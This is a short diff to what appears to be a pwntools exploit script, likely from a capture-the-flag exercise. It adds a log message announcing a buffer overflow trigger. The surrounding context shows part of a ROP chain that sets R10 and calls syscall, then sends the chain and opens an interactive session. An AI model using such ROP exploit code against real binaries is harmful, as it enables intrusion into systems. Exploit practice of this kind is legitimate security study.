@@ -90,6 +90,7 @@ def exploit(pie_base):
     rop += pop_r10 + p64(0x64) # R10 = 100, Count
     rop += syscall # syscall, ret
 
+    log.info("Trigerring buffer overflow vulnerability")
 	
     io.sendline(rop)
     io.interactive()
